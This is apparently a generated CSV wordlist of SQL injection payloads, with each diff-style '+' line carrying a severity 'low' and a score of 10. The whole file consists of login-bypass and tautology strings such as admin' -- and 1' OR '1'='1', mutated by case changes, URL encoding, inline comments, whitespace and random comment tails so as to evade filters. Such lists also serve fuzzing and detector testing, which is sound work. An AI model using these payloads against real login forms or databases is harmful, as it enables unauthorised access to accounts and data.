+admin'+-- # CezJjY /* test */,low,10
+admin'%20-- # MySQL comment,low,10
+admin'/**/-- # zDSlXWX,low,10
+ADMIN' -- # MySQL comment,low,10
+admin'	-- # MySQL comment # iAflpJvIPz,low,10
+"admin"" -- -- uKZFAoubF",low,10
+admin' -- # GfbsLsWlSN,low,10
+admin'  #,low,10
+"ADMIN""	--/**/#/**/iZCAoJlji",low,10
+ADMIN' -- /* test */,low,10
+ADMIN'/**/--%20/*%20test%20*/,low,10
+aDMin'  -- -- atLJWOFmD,low,10
+admIN' -- # dXRfPtpHf,low,10
+admin' -- # gOpJXijK # MySQL comment,low,10
+admin'%20--%20#%20eWXrWYPU,low,10
+ADMIN'+--+#+MYSQL+COMMENT,low,10
+"admin""%20--/**/--/**/comment",low,10
+ADMIN'+--+--+DeuFpBQ,low,10
+admin'	--	/*	test	*/ -- xdkSxCrE,low,10
+admin'%20--%20#%20MySQL%20comment,low,10
+admin'+--/**/--/**/comment # uLAsivbfM,low,10
+ADmin'	--,low,10
+ADMIn'++--,low,10
+ADMIN' -- /* TEST */ # MYSQL COMMENT,low,10
+admin' -- # lLFteYiiaJ /* test */,low,10
+admin'+-- -- zwRGv,low,10
+admin'/**/-- # DbOdxUOGm,low,10
+admin'%20--%20--%20gWTcZrocee # MySQL comment -- DdsvU,low,10
+admin'%20#%20--%20jpFBJRPva,low,10
+admin'%20--	/*	test	*/,low,10
+admin' # # MdpqY # JTlgPZVK,low,10
+admin'+# # MySQL comment,low,10
+admin'	--	/*	test	*/	#	oSIawTdnla	/*	test	*/,low,10
+"ADmIn"" -- -- TZKTLrVv",low,10
+"admin""+#",low,10
+admin'+--+--+comment,low,10
+aDMIn'+--,low,10
+ADMIN' -- -- odTrUzD,low,10
+aDMin'	--	#	kejPfJRxdQ	--	ktGuj,low,10
+ADmIn' # -- comment /* test */,low,10
+"admin""	--",low,10
+admin'+-- # ZZcuIhgza,low,10
+ADmin' --,low,10
+admin'	-- # MySQL comment -- dVipAwXjGi,low,10
+ADMIN'	--	#	DFABT # RNOPITZKF,low,10
+ADMIN' -- # wtYbh -- comment,low,10
+ADMIN'%20--%20/*%20test%20*/,low,10
+AdMIN' #,low,10
+admin' -- -- sxcypnark /* test */,low,10
+ADMIN' -- # MYSQL COMMENT,low,10
+adMIn'+-- # TGTaaK,low,10
+"AdMin""	--",low,10
+admIN' -- # MySQL comment,low,10
+admin'+-- -- viaoZiLY /* test */,low,10
+adMIN' -- # MySQL comment,low,10
+ADMIN'%20#%20#%20WiIJWVN,low,10
+"admin""%20--",low,10
+admin'  # /* test */,low,10
+ADMIN' -- -- COMMENT,low,10
+"AdMiN"" --",low,10
+admin'/**/--/**/--/**/comment,low,10
+"admin"" -- # mysql comment",low,10
+admin'	#	#	gqlrLi,low,10
+adMiN'/**/--,low,10
+ADMIN' -- # JrgmMsilsY # MySQL comment,low,10
+ADMIN' -- -- wnzSjHbhq,low,10
+admin'	--	/*	test	*/,low,10
+ADMIN' -- -- RmgcMLxkiZ -- comment,low,10
+admin' -- -- comment # INflScnGr # aQdZXeMPY -- vDqZCqjeJ,low,10
+admin'+-- /* test */,low,10
+admin'+-- -- mdealhdbs,low,10
+"admin"" # # UNhojY",low,10
+ADmIN' -- # UcMSYkF,low,10
+"adMIn"" -- -- gvkwlt -- comment",low,10
+admin' -- /* test */ # MySQL comment,low,10
+ADMiN' -- # IBDDWDbF,low,10
+ADMIN'	-- -- dmWeRUBl,low,10
+AdmIn' --,low,10
+ADMIN' -- -- CUMQMU,low,10
+ADMIN'%20-- -- comment,low,10
+admin'	-- # ABBuR,low,10
+AdMIN' -- # MysqL CoMmeNT,low,10
+admin'+--%20/*%20test%20*/,low,10
+aDmiN'++--,low,10
+admin'	--	#	MJQdZVqnG,low,10
+"ADMIN"" -- -- PXHeY",low,10
+admin'	--	--	zosGrSDQhh	/*	test	*/,low,10
+AdMin'+# # IGIaAMf,low,10
+"admin""/**/-- -- comment",low,10
+ADMIN' -- -- KeCljdRIc,low,10
+admin'+--%20--%20comment -- comment -- comment,low,10
+ADMIN'+--,low,10
+admin' -- # MySQL comment -- comment,low,10
+"ADMIN"" -- /* test */",low,10
+admin'/**/#/**/#/**/ucTYD /* test */,low,10
+admin' -- # MySQL comment /* test */ -- jwMFGn,low,10
+ADMIN' -- # ZeAAE /* TEST */,low,10
+admin' -- -- yvvloua /* test */,low,10
+AdMiN' -- /* tESt */,low,10
+adMiN' --,low,10
+admin' -- /* test */ /* test */,low,10
+admin' -- # MySQL comment # cIZMOwRTl # HSZZiBIwAR # MySQL comment,low,10
+ADmiN'/**/--,low,10
+1' OR '1'='1',low,10
+1'%20OR%20'1'='1',low,10
+1' OR '1'='1' -- tYwJt /* test */,low,10
+1' or '1'='1',low,10
+1'  OR  '1'='1' -- mJHHDv,low,10
+1' OR '1'='1' -- comment,low,10
+"1"" or ""1""=""1""",low,10
+1'%20||%20'1'='1',low,10
+1' or '1'='1' # MySQL comment,low,10
+1'+OR+'1'='1',low,10
+1'	OR	'1'='1',low,10
+1' OR '1'='1' # MySQL comment,low,10
+1' oR '1'='1',low,10
+1'/**/Or/**/'1'='1',low,10
+1' OR '1'='1' -- fQIfv -- comment,low,10
+1' OR '1'='1' # jdfwfe,low,10
+1'/**/OR/**/'1'='1',low,10
+1'/**/||/**/'1'='1',low,10
+1' OR '1'='1' /* test */,low,10
+1'%20Or%20'1'='1',low,10
+1' || '1'='1' /* test */,low,10
+1' Or '1'='1',low,10
+1'/**/OR/**/'1'='1'/**/--/**/comment,low,10
+1'  ||  '1'='1',low,10
+1' OR '1'='1' # iHYFy,low,10
+1'	OR	'1'='1' -- Rtzcq,low,10
+1' OR '1'='1' # ElqcSKm,low,10
+1'  OR  '1'='1' -- comment,low,10
+1' OR '1'='1' # GiuxBszx,low,10
+1' || '1'='1',low,10
+1' OR '1'='1' # BNzEjR,low,10
+1' OR '1'='1' -- sVcdN,low,10
+1' OR '1'='1' # iCRrdRZljt,low,10
+"1""%20OR%20""1""=""1""",low,10
+1'%20or%20'1'='1',low,10
+1' OR '1'='1' -- uPcwQMpfwI,low,10
+1' OR '1'='1' # DHKNE,low,10
+1'/**/OR/**/'1'='1'/**/#/**/MySQL/**/comment /* test */,low,10
+1' OR '1'='1' -- nokDoQRHt,low,10
+1'/**/or/**/'1'='1',low,10
+1' OR '1'='1' -- VXQEI -- comment,low,10
+1' OR '1'='1' # lvdohcIg,low,10
+1'	OR	'1'='1'	--	comment,low,10
+1'+or+'1'='1',low,10
+1' OR '1'='1' -- lhUVlk,low,10
+1' OR '1'='1' /* test */ # MySQL comment,low,10
+1' OR '1'='1' # CVFZTNCNPW -- COMMENT,low,10
+"1"" OR ""1""=""1""",low,10
+1'%20OR%20'1'='1' /* test */,low,10
+"1"" OR ""1""=""1"" # MySQL comment",low,10
+1'+||+'1'='1',low,10
+1'+OR+'1'='1' # MySQL comment,low,10
+1' OR '1'='1' -- zZSlUA,low,10
+"1""	OR	""1""=""1""",low,10
+1' OR '1'='1' -- kHDISbUL,low,10
+1'/**/OR/**/'1'='1'/**/#/**/MySQL/**/comment,low,10
+1'	OR	'1'='1' # MySQL comment,low,10
+1'/**/OR/**/'1'='1' -- comment # MySQL comment,low,10
+1'%20OR%20'1'='1' -- NLcrXLwTif,low,10
+"1""+OR+""1""=""1""",low,10
+1' or '1'='1' # mysql comment,low,10
+1' OR '1'='1' # iDNOR,low,10
+1' or '1'='1' -- iqGFfh,low,10
+1' OR '1'='1' -- lGyTwHGT,low,10
+1' OR '1'='1' # MySQL comment # mKYBh,low,10
+1' OR '1'='1' -- yfUBayVNF,low,10
+1'/**/or/**/'1'='1'/**/#/**/MySQL/**/comment,low,10
+1'/**/OR/**/'1'='1' -- comment,low,10
+1' OR '1'='1' -- ofYpRnEaJ -- WpIKQJzCAo,low,10
+1'%20OR%20'1'='1'%20--%20QiawycY,low,10
+1'+OR+'1'='1' -- comment,low,10
+1' Or '1'='1' /* test */ -- comment,low,10
+1' OR '1'='1' # kGJFKNlz,low,10
+1'	OR	'1'='1'	#	MySQL	comment,low,10
+1'+OR+'1'='1' # CJgXQagntK # yDSQDYKL,low,10
+1' or '1'='1' /* test */,low,10
+1'	OR	'1'='1' -- comment,low,10
+1' Or '1'='1' # dfGDlLA,low,10
+1' OR '1'='1' # HctEME,low,10
+"1"" or ""1""=""1"" # zsmcf",low,10
+1' OR '1'='1' -- rroHDHqsMQ,low,10
+1' OR '1'='1' -- OCpLmw,low,10
+1' || '1'='1' -- comment,low,10
+1' or '1'='1' -- fJpCyfED # MySQL comment,low,10
+1' OR '1'='1' -- KLJDKVVH,low,10
+1' or '1'='1' -- WEdVvqVqi,low,10
+1'/**/or/**/'1'='1'/**/#/**/mysql/**/comment,low,10
+1' or '1'='1' -- NOUXFzZCO,low,10
+1' or '1'='1' -- COMMENT,low,10
+"1"" OR ""1""=""1"" # ygiqhOCV /* test */",low,10
+1' OR '1'='1' # MySQL comment # MySQL comment,low,10
+1'  or  '1'='1',low,10
+1' OR '1'='1' /* TEST */,low,10
+1' OR '1'='1' # MYSQL COMMENT,low,10
+1'+Or+'1'='1' # mySQL cOMMent,low,10
+1' OR '1'='1' # NlEPUM,low,10
+1'%20OR%20'1'='1'%20#%20MySQL%20comment,low,10
+1'/**/or/**/'1'='1'/**//*/**/test/**/*/,low,10
+1'/**/OR/**/'1'='1'%20--%20comment,low,10
+"1""	or	""1""=""1""",low,10
+1' || '1'='1' /* test */ -- ZtBVAO,low,10
+1'	OR	'1'='1'/**/--/**/HKHOFIX,low,10
+1'  oR  '1'='1',low,10
+1'	OR	'1'='1'	#	MySQL	comment	#	FKviSNTf,low,10
+"1""%20OR%20""1""=""1""%20/*%20TEST%20*/",low,10
+"1""%20oR%20""1""=""1""",low,10
+1'	OR	'1'='1' /* test */,low,10
+1'	||	'1'='1' /* test */,low,10
+1' or '1'='1' /* test */ -- LLlOh,low,10
+1'+or+'1'='1' /* test */,low,10
+1'	or	'1'='1',low,10
+1'+or+'1'='1' # MySQL comment,low,10
+"1""	OR	""1""=""1"" -- TdnPxvAUyf",low,10
+1' or '1'='1' /* TesT */,low,10
+1'%20or%20'1'='1'%20--%20COMMENT%20/*%20TEST%20*/,low,10
+"1"" || ""1""=""1""",low,10
+1' OR '1'='1' -- UbnrT,low,10
+1'/**/or/**/'1'='1' /* TEST */,low,10
+1' OR '1'='1' -- comment -- comment,low,10
+1'+or+'1'='1'+--+NbjGRMQ,low,10
+1'+OR+'1'='1'+#+MYSQL+COMMENT+--+QWIthk,low,10
+1'+OR+'1'='1' /* test */,low,10
+1' Or '1'='1' /* test */,low,10
+1' OR '1'='1' /* test */ # JZUFueHKNX,low,10
+1' or '1'='1' /* TEST */ -- COMMENT,low,10
+1' OR '1'='1' # ikmmKuIYHp,low,10
+1' OR '1'='1' # ZICld,low,10
+"1""+OR+""1""=""1"" -- WjIyR",low,10
+"1"" OR ""1""=""1"" # bYLINioDfN",low,10
+1'	OR	'1'='1'	#	MySQL	comment -- comment,low,10
+"1"" OR ""1""=""1"" # comment",low,10
+1'	or	'1'='1'	--	comment,low,10
+"1""	OR	""1""=""1"" # eDRXAkiJA -- ABzeU",low,10
+1'++OR++'1'='1' -- comment,low,10
+1' OR '1'='1' -- JCzgdZc,low,10
+1'  or  '1'='1' # fXmwg,low,10
+1' OR '1'='1' # MySQL comment # CtKUNt -- kADZdN,low,10
+"1"" OR ""1""=""1"" -- XkoHmRS",low,10
+1'	or	'1'='1'	/*	TEST	*/,low,10
+"1"" OR ""1""=""1"" # MySQL comment -- comment",low,10
+1' || '1'='1' # MySQL comment,low,10
+1'/**/or/**/'1'='1'/**/#/**/qECgfbsqP,low,10
+"1"" OR ""1""=""1"" -- comment",low,10
+"1"" OR ""1""=""1"" -- eXWUKHlsu # dMjKSH",low,10
+1'+OR+'1'='1'+--+comment+#+HAUbFnUJi,low,10
+1'	OR	'1'='1'	/*	test	*/,low,10
+1'%20OR%20'1'='1' -- comment,low,10
+1'	Or	'1'='1',low,10
+1' OR '1'='1' # cdsPam,low,10
+1'%20OR%20'1'='1'%20#%20gqMODaRj,low,10
+1' or '1'='1' /* TEST */,low,10
+1' OR '1'='1' /* test */ -- lXvHj,low,10
+1' OR '1'='1' # QzMGTeSK -- HLOHMg,low,10
+1' OR '1'='1' -- OOdOlRyRO,low,10
+1'%20OR%20'1'='1'%20#%20MySQL%20comment # TfQSDYR,low,10
+1'	or	'1'='1'	#	cxyhrsj,low,10
+1' or '1'='1' -- coMMeNt # MySQL comment # tBLjMtUAY -- SBCrNgJd,low,10
+1' OR '1'='1' -- aWfaJ /* test */,low,10
+1' OR '1'='1' # uLQNSGx,low,10
+1'/**//**/or/**//**/'1'='1',low,10
+1'	or	'1'='1' /* test */,low,10
+1' OR '1'='1' # UlhddzYpS,low,10
+1' OR '1'='1' -- COMMENT # SDNXDHBFHR,low,10
+1' OR '1'='1' -- KpipuMDVS,low,10
+1'/**/OR/**/'1'='1' /* test */,low,10
+"1""/**/Or/**/""1""=""1""/**/--/**/cOmMEnt",low,10
+1'/**/or/**/'1'='1'  --  PGbvAM,low,10
+"1""/**/OR/**/""1""=""1"" # VBKDCRAYn",low,10
+1' or '1'='1' # aqycRxFJ /* test */,low,10
+1'	OR	'1'='1'	--	SBLcghXniX,low,10
+"1"" Or ""1""=""1"" # oaAsWStHqq",low,10
+1' or '1'='1' # KANGoXYBDD,low,10
+1'%20OR%20'1'='1'/**/#/**/MySQL/**/comment,low,10
+1'%20OR%20'1'='1'%20/*%20test%20*/ # MySQL comment,low,10
+1'/**/or/**/'1'='1'/**//*/**/TEST/**/*/,low,10
+"1"" Or ""1""=""1"" # MySQL comment # GvVFrWXQtm",low,10
+1'%20OR%20'1'='1' # VQclSXLdfs,low,10
+1'  or  '1'='1' # lgkzFykf,low,10
+1' or '1'='1' -- oyzvrpf -- hmhab,low,10
+1'/**/OR/**/'1'='1'/**/--/**/COMMENT,low,10
+1'	or	'1'='1' # MySQL comment,low,10
+1'+or+'1'='1' /* test */ -- txyxEgeRph -- VJqtV,low,10
+1'  or  '1'='1'  #  RvLDZheWAL,low,10
+1' || '1'='1' # vUSAI -- comment,low,10
+"1""/**/OR/**/""1""=""1"" /* test */",low,10
+"1"" || ""1""=""1"" /* test */ # MySQL comment",low,10
+"1""+OR+""1""=""1""+--+comment",low,10
+1'+OR+'1'='1'+--+waZofo+#+ZzUiQ,low,10
+1' OR '1'='1' # MYSQL COMMENT # MYSQL COMMENT,low,10
+1'	OR	'1'='1'	--	SIJTC -- ZDRBXywlm,low,10
+1'/**/or/**/'1'='1'/**//*/**/tESt/**/*/,low,10
+"1""/**/||/**/""1""=""1""",low,10
+1'	||	'1'='1'	--	comment,low,10
+"1""%20OR%20""1""=""1""%20#%20lKtqjTpq%20/*%20test%20*/",low,10
+1'  OR  '1'='1' -- GOyJHyjBkP,low,10
+1'/**/or/**/'1'='1' # MySQL comment,low,10
+1'+Or+'1'='1'+--+hNZTiohjE,low,10
+1'/**/||/**/'1'='1' # MySQL comment,low,10
+1' OR '1'='1' -- aEzUaodE /* test */ # MySQL comment,low,10
+1'	OR	'1'='1'	--	comment	#	MySQL	comment,low,10
+1'%20||%20'1'='1'%20/*%20TEST%20*/,low,10
+1' || '1'='1' -- AOKazH,low,10
+1'%20||%20'1'='1' -- comment,low,10
+1'/**/OR/**/'1'='1'/**/--/**/TguvrFMI,low,10
+1' || '1'='1' -- MewFp,low,10
+"1"" Or ""1""=""1"" -- COMMENT",low,10
+1'	Or	'1'='1' -- wzZgMj,low,10
+1'+OR+'1'='1' /* test */ -- fuMzCyjrcg,low,10
+1'+OR+'1'='1'+#+CrqFLvGU,low,10
+1' OR '1'='1' -- COMMENT,low,10
+1' || '1'='1' -- MKlhk,low,10
+"1"" OR ""1""=""1"" # MYSQL COMMENT /* TEST */",low,10
+1'%20OR%20'1'='1'%20--%20CNQkdRFiTX%20#%20FIiLC,low,10
+"1"" oR ""1""=""1"" # Mysql COmMeNT",low,10
+1'+OR+'1'='1'+#+MySQL+comment,low,10
+"1"" OR ""1""=""1"" # FvWGof",low,10
+"1""/**/Or/**/""1""=""1""",low,10
+1'%20OR%20'1'='1' # yWZMUEVD,low,10
+1' OR '1'='1' # eiCGdqG,low,10
+1'/**/or/**/'1'='1'/**/--/**/kqbrewxn,low,10
+"1""	OR	""1""=""1""	#	MySQL	comment",low,10
+1' || '1'='1' # comment,low,10
+1' Or '1'='1' /* tesT */,low,10
+"1""  OR  ""1""=""1"" # MySQL comment",low,10
+1' OR '1'='1' /* test */ # TrThnkp -- comment # MySQL comment /* test */,low,10
+1'%20OR%20'1'='1'%20/*%20test%20*/,low,10
+1'+OR+'1'='1'+--+EOjmZKx,low,10
+"1""+Or+""1""=""1""",low,10
+"1"" OR ""1""=""1"" # HECgBw -- iGyAObFHV",low,10
+"1""/**/or/**/""1""=""1""/**/#/**/mysql/**/comment",low,10
+1' or '1'='1' -- comment -- TUwzWakHP,low,10
+"1"" OR ""1""=""1"" -- comment # MySQL comment",low,10
+1' OR '1'='1' -- IevdF /* test */,low,10
+1'+OR+'1'='1'+/*+TEST+*/,low,10
+1' OR '1'='1' -- CmAAwauiA # MySQL comment,low,10
+1'	||	'1'='1',low,10
+1' OR '1'='1' # caUISEm,low,10
+"1""+OR+""1""=""1""+/*+TEST+*/",low,10
+1'%20or%20'1'='1' # mYsql COMMENT -- uHbDqoLO,low,10
+1'/**/OR/**/'1'='1' /* test */ # WyvsmfG,low,10
+"1""%20OR%20""1""=""1""%20--%20comment",low,10
+1' OR '1'='1' -- COMMENT -- nKFkU,low,10
+1'+OR+'1'='1'+/*+test+*/ -- comment,low,10
+"1"" or ""1""=""1"" /* tEST */",low,10
+"1""%20or%20""1""=""1"" # bstqqx /* test */",low,10
+1'%20OR%20'1'='1'/**/--/**/comment/**/#/**/HNpxX,low,10
+1' or '1'='1' # MYSQL cOMmENt,low,10
+1'	Or	'1'='1' -- cOMmeNt,low,10
+1'+OR+'1'='1'+/*+test+*/+--+comment,low,10
+1'%20OR%20'1'='1'%20#%20MySQL%20comment%20#%20lccTpHycxP,low,10
+' or 0=0 --,low,10
+' oR 0=0 # # MYSQL comMeNt,low,10
+' or 0=0 # # QytTLZ,low,10
+' OR 0=0 --,low,10
+'%20or%200=0%20--,low,10
+'+or+0=0+--,low,10
+'+OR+0=0+-- # YvyJFGlT,low,10
+' or 0=0 #,low,10
+' or 0=0 -- -- comment,low,10
+'/**/or/**/0=0/**/#,low,10
+'+or+0=0+--+--+MKIZA,low,10
+'+or+0=0+--+#+uihCcq,low,10
+' or 0=0 -- # tuhWfj,low,10
+' or 0=0 -- # ricsPZJe,low,10
+' oR 0=0 --,low,10
+' or 0=0 -- -- comment -- UdeTfQEvqz,low,10
+'/**/or/**/0=0/**/--,low,10
+' or 0=0 -- # RFwTMzKFvy,low,10
+' or 0=0 -- -- WnjmiPHq,low,10
+' or 0=0 -- # VHVfVENKh,low,10
+' OR 0=0 -- -- PqNFvHeluL,low,10
+' or 0=0 -- -- MTSjHdCfVl,low,10
+' or 0=0 -- -- myccbf,low,10
+""" or 0=0 --",low,10
+'%20OR%200=0%20--,low,10
+'+OR+0=0+--,low,10
+' or 0=0 -- # tqFMJ,low,10
+' or 0=0 -- -- gEeBwQcgs,low,10
+' OR 0=0 -- -- COMMENT,low,10
+' or 0=0 -- /* test */,low,10
+' or 0=0 -- # MySQL comment,low,10
+'	Or	0=0	--,low,10
+' or 0=0 -- -- xDPunFtgZ,low,10
+"""+oR+0=0+--",low,10
+' or 0=0 -- -- qaPsGg,low,10
+'  or  0=0  --,low,10
+'+or+0=0+--+--+oPPFLAi,low,10
+' OR 0=0 -- -- JoMOk,low,10
+' or 0=0 -- # MySQL comment /* test */,low,10
+' or 0=0 -- -- NJZDiBqidq,low,10
+""" or 0=0 -- -- XGHRvhyGJM",low,10
+' oR 0=0 -- # WlmadcK,low,10
+' or 0=0 -- -- LahAfUOo,low,10
+'	or	0=0	--,low,10
+'/**/or/**/0=0/**/--/**//*/**/test/**/*/,low,10
+' OR 0=0 -- /* TEST */,low,10
+'%20or%200=0%20--%20--%20sZTdIzbNZ%20/*%20test%20*/,low,10
+'%20oR%200=0%20--,low,10
+'%20or%200=0%20-- # epzeAu,low,10
+'/**/OR/**/0=0/**/--,low,10
+'/**/or/**/0=0/**/--/**/--/**/GkcZyQrtT,low,10
+' or 0=0 -- # mysql comment -- comment,low,10
+' oR 0=0 # # PIIPOXEh,low,10
+'	or	0=0	--	#	cJwNLoUNBu,low,10
+'+or+0=0+#,low,10
+' or 0=0 -- -- ZAwCIVEe,low,10
+' or 0=0 -- -- nUrtyh,low,10
+""" or 0=0 -- # MySQL comment",low,10
+' or 0=0 # # comment,low,10
+' or 0=0 -- # jyfDhVd,low,10
+' or 0=0 -- # mPVgslpmQ -- zyNXA,low,10
+'	or	0=0	--	#	nYxrxtz,low,10
+'  or  0=0  #,low,10
+' or 0=0 -- # Quptuje,low,10
+'%20or%200=0%20--	--	comment,low,10
+""" or 0=0 -- -- comment",low,10
+'+or+0=0+--+/*+test+*/,low,10
+'	or	0=0	--	#	MySQL	comment,low,10
+'+oR+0=0+--,low,10
+"""	or	0=0	--",low,10
+' or 0=0 -- # mIIvtlfNh,low,10
+'	OR	0=0	--,low,10
+' or 0=0 -- -- comment # tHGUh,low,10
+'  or  0=0  -- -- comment,low,10
+' or 0=0 -- # nxLobrQXEH,low,10
+""" or 0=0 -- # mysql comment",low,10
+'%20or%200=0%20-- -- comment,low,10
+' or 0=0 -- # MDmnAKC,low,10
+'	or	0=0	--	--	JawbvUGmFy,low,10
+' or 0=0 -- # yOFStN,low,10
+' || 0=0 --,low,10
+'+or+0=0+--+--+PraNan+#+MySQL+comment,low,10
+"""/**/or/**/0=0/**/--",low,10
+' or 0=0 # # LVYDvVg,low,10
+'/**/or/**/0=0/**/--/**/--/**/GTJjPPh,low,10
+'/**/or/**/0=0/**/--/**/#/**/CQeqz,low,10
+' or 0=0 -- # jpSLD,low,10
+' Or 0=0 --,low,10
+' OR 0=0 -- # xksbZ,low,10
+'  OR  0=0  --,low,10
+'%20OR%200=0%20--%20#%20MySQL%20comment,low,10
+' or 0=0 -- # ufNhehpwlQ -- gROUHMtpog,low,10
+'+Or+0=0+--+--+comment,low,10
+'+or+0=0+--+--+comment,low,10
+'+or+0=0+-- /* test */ /* test */,low,10
+' or 0=0 -- -- zYeusAi,low,10
+"""%20or%200=0%20#",low,10
+""" or 0=0 -- # zPWgMa",low,10
+' or 0=0 -- -- NBROOQM,low,10
+'	or	0=0	--+/*+test+*/+#+MySQL+comment,low,10
+'+or+0=0+# # xxvHtkReq,low,10
+' OR 0=0 -- -- cOmMEnT -- gmgmX,low,10
+"""/**/or/**/0=0/**/#/**/--/**/CBBtIDN # MySQL comment",low,10
+'/**/Or/**/0=0/**/--,low,10
+""" OR 0=0 -- # MysQl COMmENt",low,10
+'+OR+0=0+--+#+MYSQL+COMMENT,low,10
+'%20or%200=0%20--%20#%20MySQL%20comment%20--%20comment,low,10
+'%20or%200=0%20--+#+MySQL+comment,low,10
+' or 0=0 -- /* tESt */,low,10
+'	or	0=0	#,low,10
+' oR 0=0 -- -- ComMENT -- vCzNWR,low,10
+' or 0=0 -- # Uxcqlmk -- wMLXwRtL -- ONOaVIO,low,10
+' OR 0=0 -- # MySQL comment,low,10
+' or 0=0 -- # oVEoSzg # MySQL comment,low,10
+'	oR	0=0	--	--	vvpzFNbcUR,low,10
+"""+OR+0=0+--",low,10
+'%20or%200=0%20#%20#%20TTpLGqqjuW,low,10
+' OR 0=0 #,low,10
+""" or 0=0 -- -- KXjAlbTnv",low,10
+'%20OR%200=0%20# -- AkCqQxmaZV,low,10
+' OR 0=0 -- -- bqMqdKK,low,10
+"""%20or%200=0%20#%20/*%20test%20*/",low,10
+'/**/or/**/0=0/**/--/**/--/**/comment,low,10
+"""%20or%200=0%20--",low,10
+""" OR 0=0 --",low,10
+'%20or%200=0%20#,low,10
+'	or	0=0	-- -- yQWePN -- comment,low,10
+'%20or%200=0%20-- # jFXWfUr,low,10
+'/**/OR/**/0=0/**/#,low,10
+' or 0=0 -- # bPKqBHZ # ofiqgreFC,low,10
+"""/**/or/**/0=0/**/#/**/--/**/NghcLnMOny",low,10
+'%20OR%200=0%20-- # JLEKL,low,10
+""" or 0=0 -- -- zYMfoA /* test */",low,10
+' OR 0=0 # # COMMENT,low,10
+'	OR	0=0	#,low,10
+""" or 0=0 -- /* test */",low,10
+'%20or%200=0%20--+--+AzOOxwNHId,low,10
+""" Or 0=0 -- /* TESt */",low,10
+"""+OR+0=0+--+#+MySQL+comment",low,10
+' OR 0=0 -- -- iJQyGukfy,low,10
+'/**/OR/**/0=0/**/-- -- COMMENT /* test */,low,10
+' Or 0=0 -- /* test */,low,10
+""" or 0=0 # /* test */",low,10
+'	OR	0=0	-- /* test */,low,10
+'%20OR%200=0%20--%20--%20ZRAoibIFlE+#+CzPVfrUkYL,low,10
+'+or+0=0+-- # MySQL comment -- comment,low,10
+'	OR	0=0	-- # LeFPVJYH,low,10
+'/**/or/**/0=0/**/#%20#%20zrTMHnH%20#%20MySQL%20comment,low,10
+'	or	0=0	--	#	gnhjKBW,low,10
+'%20or%200=0%20-- -- kfxex,low,10
+' or 0=0 -- /* test */ -- comment -- YdMGBNrHQ,low,10
+'	OR	0=0	-- # MySQL comment,low,10
+'%20Or%200=0%20--%20#%20mYsqL%20cOmment,low,10
+' OR 0=0 -- -- ISVJV,low,10
+"""%20oR%200=0%20--",low,10
+'%20or%200=0%20--%20--%20iHmkSg,low,10
+'+or+0=0+--+--+Dzypoyi,low,10
+' or 0=0 -- # MYsqL commENt # EzQGtP,low,10
+' OR 0=0 -- # MySQL comment -- comment -- oTxXp,low,10
+""" or 0=0 -- -- JxsLW # MySQL comment",low,10
+' OR 0=0 # /* teSt */,low,10
+'+or+0=0+-- -- comment,low,10
+' OR 0=0 -- -- COMMENT /* test */,low,10
+'/**/or/**/0=0/**/--/**//*/**/test/**/*//**//*/**/test/**/*//**/#/**/MySQL/**/comment,low,10
+'+or+0=0+#+#+MySQL+comment,low,10
+"""  OR  0=0  --",low,10
+'	OR	0=0	--	--	comment,low,10
+'+or+0=0+--+#+mysql+comment,low,10
+' or 0=0 # # bhgmprtc,low,10
+' or 0=0 # # MySQL comment # jFUIDgU,low,10
+'/**/or/**/0=0/**/--/**/#/**/XqfKqycZ /* test */ /* test */,low,10
+'+or+0=0+-- # MySQL comment,low,10
+'%20||%200=0%20--,low,10
+' || 0=0 #,low,10
+' OR 0=0 -- -- QYYHCQN,low,10
+'	OR	0=0	-- # mYsql COMMENT,low,10
+""" or 0=0 #",low,10
+'+OR+0=0+#+#+MySQL+comment,low,10
+' oR 0=0 -- -- WTrzdJ # CqGHitzVJ,low,10
+'+OR+0=0+-- -- comment,low,10
+""" OR 0=0 -- -- KSJKNJAGR",low,10
+' OR 0=0 # # MySQL comment,low,10
+'	or	0=0	-- -- comment -- comment,low,10
+""" or 0=0 -- # xaMWCv -- nptOX",low,10
+'/**/OR/**/0=0/**/#/**/--/**/comment,low,10
+'%20%20Or%20%200=0%20%20--,low,10
+' OR 0=0 -- # YAgjpwTDQ,low,10
+'	or	0=0	--	#	MySQL	comment	#	MySQL	comment	#	MySQL	comment,low,10
+'/**/or/**/0=0/**/--/**//*/**/test/**/*//**//*/**/test/**/*/,low,10
+'	or	0=0	# /* test */,low,10
+'+or+0=0+--+#+QLKkgT+/*+test+*/+/*+test+*/ -- qRocSogKC,low,10
+'%20or%200=0%20--%20#%20MySQL%20comment,low,10
+'+OR+0=0+-- # MYSQL COMMENT,low,10
+'%20Or%200=0%20#,low,10
+'%20or%200=0%20-- # MySQL comment,low,10
+'/**/oR/**/0=0/**/--,low,10
+' or 0=0 -- -- pVcTGygCny -- faxnajux,low,10
+' or 0=0 -- -- comment # tmfxxhp,low,10
+'	oR	0=0	--,low,10
+' or 0=0 -- # ujCDS,low,10
+'+or+0=0+-- # odqdlo,low,10
+'+OR+0=0+#,low,10
+'	or	0=0	--	#	mysql	comment,low,10
+' OR 0=0 -- # QPFQRKFK # MySQL comment,low,10
+'/**/or/**/0=0/**/#/**/--/**/WtSFTOVaTu,low,10
+""" or 0=0 -- -- comment -- comment -- RGwkLB",low,10
+' or 0=0 -- -- comment -- comment # wkFhA,low,10
+'%20OR%200=0%20#,low,10
+'+OR+0=0+--	/*	TEST	*/,low,10
+' OR 0=0 -- # xpoaxXchh /* test */,low,10
+' OR 0=0 -- -- CommeNT,low,10
+' or 0=0 # # IqygwhZgt,low,10
+' or 0=0 -- -- vuhaherkci # bnzaxhlng,low,10
+'%20or%200=0%20--%20--%20TbDxgC,low,10
+'+||+0=0+--,low,10
+' or 0=0 -- -- QYpThn,low,10
+'%20or%200=0%20--%20/*%20test%20*/%20#%20MySQL%20comment%20--%20comment,low,10
+"""+or+0=0+--+--+nGzJl /* test */",low,10
+'%20or%200=0%20-- # MRoSlET,low,10
+"""	OR	0=0	--",low,10
+'	oR	0=0	-- /* test */,low,10
+' or 0=0 -- -- sVpuNvnS # nMoQuxpVvj -- comment,low,10
+'+or+0=0+--+--+syEycXHtD,low,10
+' or 0=0 -- # iBmejOHir # MySQL comment,low,10
+'/**/or/**/0=0/**/--/**/#/**/MySQL/**/comment/**/--/**/Hnfohj,low,10
+' or 0=0 -- -- comment -- comment,low,10
+' Or 0=0 -- /* tESt */ # JPMlAY /* test */,low,10
+'/**/or/**/0=0/**/--/**/--/**/comment/**/--/**/oYJkRvOR,low,10
+"""%20OR%200=0%20#",low,10
+'	OR	0=0	--	#	MySQL	comment,low,10
+' or 0=0 -- /* test */ -- wnVagN,low,10
